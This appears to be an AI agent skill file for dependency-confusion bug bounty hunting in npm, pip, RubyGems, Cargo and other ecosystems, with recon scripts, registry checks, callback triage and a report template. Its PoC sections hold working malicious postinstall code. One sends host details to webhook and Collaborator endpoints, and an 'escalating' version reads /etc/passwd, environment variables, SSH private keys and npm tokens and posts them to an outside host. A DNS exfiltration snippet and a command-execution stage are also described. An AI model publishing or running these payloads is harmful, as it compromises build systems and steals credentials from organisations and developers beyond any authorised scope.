---
name: dependency-confusion
description: Elite dependency-confusion / package-substitution hunting skill for authorized bug bounty, pentests, and supply-chain audits. ALWAYS activate for dependency confusion, dependency substitution, namespace confusion, package shadowing, internal package hijack, unclaimed npm package, unclaimed crate, claimable package name, private package leaked publicly, "is this package on npm/crates.io", scoped package not reserved, @scope not claimed, .npmrc scope registry, package-lock resolved private registry, Cargo.toml registry confusion, Cargo.lock source, leaked package.json/yarn.lock/pnpm-lock, internal package names in JS bundle/webpack/sourcemap/HAR, "find dependency confusion on $target", "check these packages for confusion", supply-chain takeover via public registry, postinstall RCE via confused package, or ANY request to find/verify/exploit dependency-confusion across npm (Node), pip (Python), gem (Ruby), cargo (Rust), Maven, NuGet, Composer, and Go modules. Drives the full kill chain — name harvest → source classification → public-registry claimability → scope-ownership check → callback verification → IP/ASN validation → report. Multi-ecosystem. Never squats names you don't own. Token-efficient.
---

# DEPENDENCY-CONFUSION — Package Substitution Hunter

> The core rule: a 404 on the public registry is **not a bug**.
> It's a candidate. The bug is proven only when a **callback arrives from the target's infrastructure**
> confirming they installed your package. Many scanners (AWS, GCP, Azure, Alibaba, npm crawlers)
> will install anything you publish — you MUST verify the callback IP belongs to the target.

**Top real-world payouts:** Alex Birsan ($130k+ across Apple, Microsoft, PayPal, Shopify, Netflix, Tesla · 2021), Sl4x0 (5-figures automated · 2025), Fuleki Ioan ($2,500 Bugcrowd · 2024), Naveen Kumawat ($5k Twilio · 2024), Abdelkarim Mouchquelita (RedBull RCE CVE-2025-30406), Sm4rty (HackerOne private · 2022), Anand Sreekumar (HackerOne private · 2024).

---

## Rule 0 — Authorization & ethics (non-negotiable)

- Only test targets you are authorized to (in-scope bounty / pentest / CTF).
- **Never register a public name you do not own** to "prove" confusion against someone else's build. That is a live supply-chain attack on third parties.
- Prove it the safe way: a benign PoC package with a passive callback (DNS/HTTP from `postinstall`) under a name the program invited you to claim.
- **Two-stage publish strategy** (Sl4x0 method): First publish a benign placeholder (v99.99.98) to reserve the name. Wait 24h. Then publish the callback payload (v99.99.99). This prevents other researchers from squatting your finding.

## Rule 1 — Kill list (instant reject — do not report)

- Package **exists** on the public registry → not confusion (that's just a public dep).
- Scoped `@org/pkg` where the **scope is reserved** by an org on npm → attacker can't publish under it. LOW/informational only.
- Dep pinned to `file:` / `link:` / `git+` / `path =` / tarball URL → explicit source, safe.
- Monorepo **workspace/local** package (in-repo `name`, `workspace:` protocol, Cargo workspace member) → resolved locally.
- "The name looks internal" with no registry check → not a finding. **Confirm 404 or kill.**
- Typosquatting / similar-name → that's typosquatting, a different bug class.
- **A 404-only with no callback is NOT a bug.** You MUST verify with a callback from the target's actual infrastructure.

## Rule 2 — What we hunt (valid classes)

| Class | Condition | Severity |
|-------|-----------|----------|
| **Confirmed callback from target IP** | Target's build system installed your PoC package | CRITICAL (verified RCE) |
| **npm unscoped confusion** | bare name, unclaimed on npmjs, default registry not overridden | HIGH |
| **npm lockfile-proven internal** | name resolved from a private host in `package-lock.json` AND unclaimed publicly | HIGH |
| **npm unclaimed scope** | `@scope/pkg` where the **scope itself** is unclaimed on npm | HIGH |
| **npm recon leak** | internal name scraped from sourcemap / JS bundle / HAR, unclaimed publicly | HIGH (unscoped) / MEDIUM (scoped) |
| **pip extra-index-url confusion** | `--extra-index-url` in requirements.txt + name unclaimed on PyPI | HIGH |
| **RubyGems confusion** | gem name unclaimed on rubygems.org | HIGH |
| **cargo crates.io confusion** | bare crate (no `registry`/`path`/`git`), unclaimed on crates.io | HIGH |
| **NuGet prefix abusable** | ID prefix not reserved on nuget.org | MEDIUM |
| **Maven repo-order abuse** | repo list allows public shadow of internal groupId:artifactId | MEDIUM |
| **npm private-default** | unscoped unclaimed, but `.npmrc registry=` is private (proxy-dependent) | MEDIUM |
| **404 only, no callback** | Package is unclaimed but no evidence target would install it | LOW/Informational |

## Rule 3 — Callback verification (the most important step)

**You will receive many false-positive callbacks.** When you publish a PoC package, npm ecosystem scanners (AWS CodeArtifact, GCP Artifact Registry, Alibaba npm mirror, Microsoft sandbox, Tencent, OVH, hscan, security scanners, etc.) will automatically install it to verify it. These are NOT valid findings.

**Real-world example:** Publishing `supplyhub@1.0.2` on npm resulted in 12 unique installs in 15 minutes — but only the callback from the target's own Alibaba Cloud IP was relevant. The rest were scanners (AWS, Tencent, OVH, Russian VPS).

### Verification process (Sl4x0 / Fuleki Ioan method):

1. **Collect all callbacks** — hostname, username, cwd, source IP, timestamp.
2. **Filter known scanners:**
   - AWS (EC2/GCP/Azure generic ranges) → IGNORE
   - Alibaba (AS37963) → IGNORE
   - Tencent (AS45090) → IGNORE
   - Generic cloud IPs without target association → IGNORE
3. **WHOIS/ARIN lookup on remaining IPs:**
   - Does the IP belong to the target's ASN?
   - Does it resolve to the target's domain?
   - Does the hostname match target's naming convention?
4. **High-confidence hits:**
   - IP in target's ASN range
   - Hostname containing target name (`target-build-01`, `ci.target.com`)
   - CWD containing target-specific paths
   - Install happening in a CI/CD context (Jenkins, Buildkite, GitHub Actions on target's org)

**Example from real findings:**
```
HIGH CONFIDENCE: IP 203.0.113.50 → ASN belongs to target
  hostname: build-server-prod-01.target.com
  user: jenkins
  cwd: /var/lib/jenkins/workspace/target-app/node_modules/@target/internal-pkg

FALSE POSITIVE: IP 34.57.145.161 → GCP generic (AS396982)
  hostname: aabee3aca2ac
  cwd: /app
```

---

## The pipeline (run in order)

### Phase 1 — Harvest candidate names (9 methods)

#### Method A: FFUF / directory bruteforce for dependency files (Sm4rty, Anand Sreekumar)
Fuzz common paths on target subdomains to find exposed dependency files:
```bash
# Fuzz for package files
ffuf -c -w /usr/share/wordlists/common.txt -u https://engineering.target.com/FUZZ \
  -mr "package.json\|package-lock\|requirements.txt\|Gemfile\|pom.xml"

# Shodan + dirbust (Sm4rty method): find IPs first, then fuzz for /ui/package.json
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://XX.XX.XX.XX/FUZZ/package.json -ac
```

Package-lock.json is more valuable than package.json — it leaks exact `resolved` registry URLs showing internal package names. Example: `https://npm.internal.target.com/private-pkg/-/private-pkg-1.0.0.tgz`

#### Method B: Sourcemap deep recon (MOST EFFECTIVE — Alex Birsan, Fuleki Ioan, Sourcemap Explorer)
Sourcemaps contain `sources[]` array with `node_modules/<name>` paths revealing internal packages.

```bash
# 1. Find sourcemaps from JS bundles
curl -sI https://target.com/assets/main.js | grep -i sourcemap

# 2. Download map and extract internal package names
curl -s https://target.com/assets/main.js.map | python3 -c "
import sys, json
sm = json.load(sys.stdin)
names = set()
for s in sm.get('sources', []):
    if 'node_modules/' in s:
        parts = s.split('node_modules/')[1].split('/')
        if parts[0].startswith('@'):
            names.add(f\"{parts[0]}/{parts[1]}\")
        else:
            names.add(parts[0])
for n in sorted(names):
    print(n)
"
```

**What to look for:**
- `node_modules/@company/internal-lib` → scoped internal package
- `node_modules/internal-lib` → unscoped internal package (HIGHEST RISK)
- `webpack://@scope/pkg` → webpack-inlined scoped package
- Monorepo path patterns: `packages/*`, `libs/*`

**Real-world hit rate:** ~5% of targets leak claimable internal names this way (Birsan 2021, Twilio engagement 2026).

#### Method C: JS Bundle / HAR file scanning (Sl4x0, GodfatherOrwa)
Use Burp JS Miner extension or manual grep on downloaded JS:

```bash
# Extract import/require patterns from JS
grep -rohE '(require\(|from\s+)[\"'"'"'](@?[a-zA-Z0-9._/-]+)[\"'"'"']' *.js | sort -u

# From HAR export (Burp)
python3 -c "
import json
with open('target.har') as f:
    har = json.load(f)
for entry in har['log']['entries']:
    url = entry['request']['url']
    if url.endswith('.js'):
        print(url)
"
```

#### Method D: Public dependency file probing + registry URL analysis (Anand Sreekumar method)
```bash
curl -s https://target.com/package.json
curl -s https://target.com/package-lock.json
curl -s https://target.com/requirements.txt
curl -s https://target.com/Gemfile
curl -s https://target.com/pom.xml
curl -s https://target.com/node_modules/.package-lock.json
curl -s https://target.com/.npmrc
```

**package-lock.json is MORE valuable than package.json** — it reveals:
- `resolved` field with private registry URLs (`https://npm.internal.target.com/...`)
- ALL transitive dependencies (not just direct)
- Exact versions and integrity hashes

**Package-lock.json registry analysis workflow:**
```bash
# 1. Find package-lock.json
curl -s https://engineering.target.com/package-lock.json | jq '.packages[] | select(.resolved != null) | {name, resolved}'

# 2. Extract registry URLs and check each for 404 (Anand's method)
curl -s https://engineering.target.com/package-lock.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
lock = data.get('packages', {}) if 'packages' in data else data.get('dependencies', {})
for name, info in lock.items():
    resolved = info.get('resolved', '')
    if '//' in resolved and ('npm' in resolved or 'registry' in resolved or 'internal' in resolved or target_domain in resolved):
        print(f'{name} -> {resolved}')
"

# 3. Check each internal-looking registry URL for 404
# If a package resolves from an internal registry AND that name is unclaimed on public npm → CRITICAL
```

#### Method E: GitHub dorking (Alex Birsan, Naveen Kumawat, Dhiyanesh Geek)
```bash
gh search code --filename='package.json' 'internal' --owner target-org
gh search code --filename='.npmrc' 'registry' --owner target-org
gh search code --filename='requirements.txt' '@internal' --owner target-org
gh search code --filename='Dockerfile' 'npm install' --owner target-org
```

**GitHub search queries (browser):**
- `org:target-org dependencies language:json` — find package.json files
- `org:target-org filename:package.json` — all package.json across org
- `org:target-org filename:requirements.txt` — Python deps
- `org:target-org filename:.npmrc registry` — private registry URLs
- `org:target-org filename:renovate.json` — Renovate bot configs (GOLD)
- `org:target-org filename:.github/workflows npm install` — CI workflows
- `org:target-org filename:Dockerfile "npm install"` — Docker + npm

**Renovate bot configs are GOLD** — they often contain:
- `registryUrls` array listing ALL registries (including public fallback)
- Internal package names in `packageRules` / `regexManagers`
- Dependency version constraints revealing internal naming patterns
- Service account emails and maintainer info

Search for:
- Committed `.npmrc` with private registry URLs
- `package.json` with internal-looking dependency names
- CI configs (`.github/workflows/*`, `Jenkinsfile`, `.gitlab-ci.yml`) running `npm install`/`pip install`
- Leaked lockfiles showing internal `resolved` URLs

#### Method F: GraphQL introspection (Sanaullah Aman Korai - 2025)
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

Look for fields like `packages`, `dependencies`, `modules` that may leak internal package names.

#### Method G: Chrome extensions for passive detection
- **KingOfBugbounty/Dependency-Confusion-Hunter** — Passive Chrome extension analyzing JS + sourcemaps
- **PACO (Package Confuser)** — Scans GitHub repos for unpublished deps (Shahwar Shah)
- **Sourcemap Explorer** — Extracts all package names from sourcemaps with version info

#### Method H: Certificate Transparency Logs (crt.sh)
Search crt.sh for subdomains that may reveal internal package naming patterns:
```bash
# Search for internal naming patterns via cert logs
curl -s "https://crt.sh/?q=%25.supplyhub.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Look for subdomains containing: dev, mock, internal, private, lib, pkg, api, npm, registry
curl -s "https://crt.sh/?q=%25.dev.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

Example find: `supplyhub.mock.dev.travix.com` revealed the internal package name `supplyhub`.

### Phase 2 — Check claimability on public registries

```bash
# npm
curl -sI https://registry.npmjs.org/<package-name> | grep -i '200\|404'
npm view <package-name> version 2>/dev/null || echo "404 — UNCLAIMED"

# npm scoped (check scope first)
curl -sI https://registry.npmjs.org/@scope%2fpackage | grep -i '200\|404'
curl -s https://registry.npmjs.org/-/v1/search?text=scope:@scope | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Scope objects: {d[\"total\"]}')"

# PyPI
curl -sI https://pypi.org/pypi/<package>/json | grep -i '200\|404'

# RubyGems
curl -sI https://rubygems.org/api/v1/gems/<package>.json | grep -i '200\|404'

# crates.io
curl -sI https://crates.io/api/v1/crates/<crate> | grep -i '200\|404'
```

**Important edge cases:**
- `@scope` returns 405 (doesn't exist) → scope is claimable (but may require paid npm account as of 2026)
- Package returns 404 at latest but has old versions → use `npm view <pkg> versions --json`
- Package exists but is "unpublished" → still accessible to anyone who had it in lockfile

### Phase 3 — PoC publishing strategies

#### Strategy A: Two-stage publish (Sl4x0 method — recommended for high-value targets)
Stage 1 reserves the name. Stage 2 (24h later) adds callback. Prevents other researchers from squatting your finding.

**Stage 1 — Reserve the name (benign placeholder):**
```json
{
  "name": "<internal-package-name>",
  "version": "99.99.98",
  "description": "",
  "main": "index.js",
  "scripts": { "postinstall": "node index.js" }
}
```
```js
// index.js — Stage 1: dead simple, no callback yet
// Just exports an empty module
module.exports = {};
```
```bash
npm publish
```
Wait 24h minimum. This reserves the name so no one else can claim it.

**Stage 2 — Callback payload (publish after 24h):**
```json
{
  "name": "<internal-package-name>",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "node index.js",
    "postinstall": "node index.js"
  }
}
```
```js
const https = require('https');
const os = require('os');
const data = JSON.stringify({
  p: process.env.npm_package_name,
  hn: os.hostname(),
  un: os.userInfo().username,
  cwd: process.cwd(),
});
const endpoints = [
  { hostname: 'YOUR-WEBHOOK-ID.webhook.site', path: '/' },
  { hostname: 'YOUR-BURP-COLLAB.oastify.com', path: '/' },
];
for (const ep of endpoints) {
  const opts = { hostname: ep.hostname, path: ep.path, method: 'POST',
    headers: { 'Content-Type': 'application/json',
               'Content-Length': Buffer.byteLength(data) }};
  const req = https.request(opts);
  req.on('error', () => {});
  req.write(data);
  req.end();
}
```

#### Strategy B: Escalating file exfiltration (proven in Trip.com engagement)
Publish 3 versions in quick succession to escalate the PoC severity:

**v1:** Basic callback — hostname, username, cwd (proves install)
**v2:** File exfiltration — reads `/etc/passwd`, `/proc/self/environ`, `.ssh/id_rsa`, `.npmrc`, `.gitconfig` (proves impact)
**v3:** Execute commands — `id`, `env`, `uname -a`, network scan (proves RCE)

```js
// postinstall.js — v2 file exfil (proven to capture SSH keys + npm tokens)
var os = require('os');
var fs = require('fs');
var https = require('https');

var files = [
  '/etc/passwd',
  '/etc/hostname',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/home/' + os.userInfo().username + '/.ssh/id_rsa',
  '/home/' + os.userInfo().username + '/.npmrc',
  '/home/' + os.userInfo().username + '/.gitconfig',
];

var leaked = {};
files.forEach(function(f) {
  try { leaked[f] = fs.readFileSync(f, 'utf8').trim().substring(0, 500); } catch(e) {}
});

var data = JSON.stringify({
  pkg: process.env.npm_package_name,
  ver: process.env.npm_package_version,
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  platform: process.platform,
  node: process.version,
  leaked_files: leaked,
});

var req = https.request({ hostname: 'YOUR-WEBHOOK.webhook.site', path: '/',
  method: 'POST', headers: { 'Content-Type': 'application/json' }});
req.write(data);
req.end();
```

**What gets exfiltrated in practice (real results from Trip.com engagement):**
- SSH private keys (`~/.ssh/id_rsa`) → lateral movement
- npm auth tokens (`~/.npmrc`) → publish as the target org
- GitHub tokens (`GITHUB_TOKEN` env var) → access private repos
- CI environment (`GITHUB_ACTIONS=true`, `CI=true`, `GITHUB_WORKFLOW_REF`) → identify pipeline
- Git identity (`~/.gitconfig`) → impersonate developers

#### Strategy C: Canary token callback (Anand Sreekumar method)
Use canarytokens.org or similar for simple HTTP callbacks:
1. Generate a canary token URL
2. Embed in `postinstall` script
3. When package installs on target → canary fires with source IP + user agent
4. Check canary dashboard for callback evidence

#### Strategy D: DNS callback fallback (when HTTP is firewalled — Birsan method):
```js
const dns = require('dns');
const os = require('os');
const encoded = Buffer.from(os.hostname()).toString('hex');
dns.resolve(`${encoded}.YOUR-DNS-CALLBACK.com`, () => {});
```

**Expected false-positive callback patterns (verified from real engagement):**
```bash
# These IPs/hosts are ALWAYS false positives — scanners, not targets:
AWS:      54.87.90.161, 34.196.43.233    (hostname: scan-*, user: scan/runner)
Alibaba:  120.55.68.29                    (hostname: hex container ID, user: root)
Tencent:  175.178.28.51                   (hostname: hex container ID, user: root)
OVH:      51.255.198.29                   (hostname: dev-laptop-*, user: sandboxuser)
Azure:    20.73.83.240                    (user-agent: sr-malware-detection)
Russian:  213.33.190.52, 194.154.78.134   (Vimpelcom ISP, generic desktop names)
```

**Real callback verification example from Trip.com engagement:**
```
Callback IP: 120.55.68.29 (Alibaba Cloud, Hangzhou — Trip.com parent ASN)
  hostname: ac1bd2859cf3          ← hex = Docker container ID
  user: root                       ← container running as root
  cwd: /app                        ← typical container cwd
  platform: linux, node: v18.16.1
  → VERDICT: FALSE POSITIVE (generic container scanner / npm mirror)
```

Only report if: callback IP belongs to the target's SPECIFIC ASN AND hostname contains the target domain name (e.g., `build-01.target.com`).

### Phase 4 — Monitor and verify callbacks

Set up a monitoring server that:
1. Captures all HTTP requests + DNS queries
2. Records: timestamp, source IP, hostname, username, cwd, package name
3. Runs WHOIS/ARIN on each unique IP to classify it

```bash
# Use multiple callback endpoints for redundancy:
# 1. webhook.site (free, persistent)
# 2. Burp Collaborator (shows HTTP + DNS)
# 3. Your own VPS with nginx logging

curl -s https://webhook.site/token/YOUR-TOKEN/requests | python3 -c "
import sys, json
d = json.load(sys.stdin)
for r in d.get('data', []):
    body = r.get('content', '')
    ip = r.get('ip', '?')
    ts = r.get('created_at', '?')
    print(f'[{ts[:19]}] {ip} -> {body}')
"
```

### Phase 5 — Write report

**Required evidence for triage:**
1. 📸 Screenshot of npm/PyPI/etc. 404 response showing package is unclaimed
2. 📸 Sourcemap/JS bundle showing internal package name in production code
3. 📸 PoC package published on registry
4. 📸 **Callback evidence with target-specific IP** (mandatory — Fuleki Ioan $2,500 report)
5. 📸 WHOIS/ARIN showing callback IP belongs to target's ASN
6. 📸 Hostname/username/cwd proving install happened on target infrastructure

**Use `confused` tool for initial triage (Dhiyanesh Geek / Sm4rty method):**
```bash
# Install
go install github.com/visma-prodsec/confused@latest

# Scan npm manifest
confused -l npm package.json

# Scan pip requirements
confused -l pip requirements.txt

# Scan Ruby Gemfile
confused -l gem Gemfile

# Output: lists each package + whether it exists on public registry
```

**Bug bounty report template:**
```markdown
## Title
Dependency Confusion leading to RCE via unclaimed internal package `<PKG>`

## Summary
The application at <URL> references an internal package `<PKG>` that is unclaimed
on the public npm/PyPI/Maven registry (HTTP 404). An attacker can register this
name and publish a malicious version, causing the build system to install and
execute attacker code (RCE).

## Source of Package Name
- Found in: <sourcemap URL / package-lock.json / GitHub repo / crt.sh / etc.>
- Screenshot: [package name visible in source]
- Registry check: `curl -sI https://registry.npmjs.org/<PKG>` → 404

## Steps to Reproduce

### 1. Verify package is unclaimed
```bash
curl -sI https://registry.npmjs.org/<PKG> | head -1
# Expected: HTTP/2 404
```

### 2. Publish PoC package with escalating severity

**v1 (basic callback):** Published `<PKG>@1.0.0` with postinstall sending hostname + username to webhook
**v2 (file exfiltration):** Published `<PKG>@1.0.1` with postinstall reading `/etc/passwd`, `.ssh/id_rsa`, `.npmrc`, `env`
**v3 (RCE):** Published `<PKG>@1.0.2` with command execution + data exfiltration

### 3. Callback evidence

| # | Time (UTC) | Source IP | Hostname | User | Location | Data Leaked |
|---|-----------|-----------|----------|------|----------|-------------|
| 1 | HH:MM | <IP> | <hostname> | <user> | <city, country> | System info |
| 2 | HH:MM | <IP> | <hostname> | <user> | <city, country> | `/etc/passwd`, SSH key, npm token |

**File contents captured:**
```
/etc/passwd:
root:x:0:0:root:/root:/bin/bash
...

~/.ssh/id_rsa:
-----BEGIN OPENSSH PRIVATE KEY-----
...

~/.npmrc:
//registry.npmjs.org/:_authToken=npm_...
```

### 4. IP/ASN verification
```bash
whois <callback-IP>
# Shows IP belongs to target organization (ASN <ASN>)
```

## Impact
Remote Code Execution on build/CI servers:
- Steal cloud credentials, API keys, environment variables
- Backdoor production builds (supply-chain compromise)
- Pivot to internal network via leaked SSH keys
- Publish malicious packages using stolen npm tokens

CVSS: 9.8 (CRITICAL) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Remediation
1. Register `<PKG>` (and all other internal package names) on public registries as placeholders
2. Use scoped packages (`@target/<PKG>`) with reserved scope on npm
3. Configure `.npmrc` to pin private registry for internal scopes
4. Rotate any credentials that may have been exposed (npm tokens, SSH keys, GitHub tokens)
5. Use `npm ci` with committed lockfiles in CI/CD
6. Remove `--extra-index-url` fallback from pip configuration
```

---

## Ecosystem-specific notes

### npm (JavaScript)
- **Scoped packages** (`@scope/pkg`) are safe ONLY if you own the scope on npmjs.org
- **Unscoped packages** are highest risk — any unclaimed name is squattable
- `.npmrc` with `@scope:registry=http://private-reg` only protects that scope
- Default `registry=https://registry.npmjs.org` means EVERYTHING not scope-pinned can be confused
- **Alias packages** (npm v6.9+): `"pkg": "npm:@scope/pkg@1.0.0"` — check if alias target is claimed

### pip (Python)
- **`--extra-index-url` is the biggest footgun** (Alex Birsan, Microsoft $40k)
- pip checks ALL indexes and installs highest version
- No namespace/scoping support at the protocol level
- Indicator: `pip install -r requirements.txt --extra-index-url https://private.pypi.com/simple`
- Python has no lifecycle scripts by default — but `setup.py` can execute code at install time

### RubyGems (Ruby)
- No native namespace support
- `gem install --source` behaves like pip's `--extra-index-url`
- Shopify paid $30k for `shopify-cloud` gem confusion

### NuGet (.NET)
- ID prefix reservation on nuget.org protects `Acme.*` prefixes
- Package source mapping (NuGet 6.0+) per-package feed pinning
- CVE-2021-24105 was the original NuGet confusion

### Maven (Java)
- `groupId:artifactId` acts as namespace — but repo ORDER matters
- If a public repo (Maven Central) is checked BEFORE private repo, and has same `groupId:artifactId`, it can shadow
- Check `repositories` block in `pom.xml`

### Cargo (Rust)
- Bare crate name (no `registry =`, no `path =`, no `git =`) resolves to crates.io
- `Cargo.lock` records `source = "registry+https://github.com/rust-lang/crates.io-index"`
- Namespace: crates.io does NOT support scopes — any unclaimed name is fair game

---

## Quick reference — callback triage

```
Callback received
├─ Source IP matches target ASN? → HIGH CONFIDENCE (report)
├─ Hostname contains target domain? → HIGH CONFIDENCE (report)
├─ Hostname UUID/hex + GCP/AWS IP? → FALSE POSITIVE (scanner, ignore)
├─ IP from Alibaba (AS37963)? → FALSE POSITIVE (npm mirror)
├─ IP from Tencent (AS45090)? → FALSE POSITIVE (npm mirror)
├─ PATH contains scanner tool name? → FALSE POSITIVE
└─ Can't determine? → Wait for more callbacks, check again in 24h
```

## Real-world chain patterns
| Bug | Chain partner | Result |
|-----|--------------|--------|
| Dep-confusion RCE | + internal secrets in env | Full cloud takeover (Shehzad Ali 2025) |
| Dep-confusion RCE | + npm token in CI | Publish backdoored versions of real packages |
| Dep-confusion callback | + sourcemap leak of full source | Credential harvesting from source |
| Unclaimed `@scope` | + public npm 405 | Scope org squatting if paid account available |

## Tools reference (real ones that work)
| Tool | Author | Use |
|------|--------|-----|
| [confused](https://github.com/visma-prodsec/confused) | Visma | Manifest scanning (npm/pip/gem — Sm4rty/Dhiyanesh method) |
| [canarytokens](https://canarytokens.org) | Thinkst | Generate callback URLs for PoC (Anand method) |
| [DepFuzzer](https://github.com/synacktiv/DepFuzzer) | Synacktiv | Automated confusion testing |
| [npmjack](https://github.com/root4loot/npmjack) | root4loot | JS + sourcemap package extraction |
| [PACO](https://github.com/shahwarshah/PACO-Package-Confuser) | Shahwar Shah | Chrome extension for GitHub dep scanning |
| [DepCheck](https://github.com/BlackHatExploitation/dependency-confusion-exploitation-guide) | BlackHatExploitation | Universal scanner (handles all lockfiles) |
| [Sourcemap Explorer](https://sme.mapree.dev) | mapree | Extract package.json from sourcemaps |
| [Dependency-Confusion-Hunter](https://github.com/KingOfBugbounty/Dependency-Confusion-Hunter) | KingOfBugbounty | Chrome extension passive detection |

## Defensive recommendations (for reports)
1. **Squat your own names** on public registries — register empty placeholder packages
2. **Use scoped packages** and **own your org scope** on npm
3. **Pin registries per scope** in `.npmrc`: `@company:registry=https://private-reg.company.com`
4. **Commit lockfiles** and use `npm ci` (not `npm install`) in CI
5. **Avoid `--extra-index-url`** in pip — use a single private index
6. **Enable NuGet package source mapping** per package ID
7. **Set `canonical: false`** in Composer for private packages
8. **Monitor** public registries for new packages matching your internal naming patterns
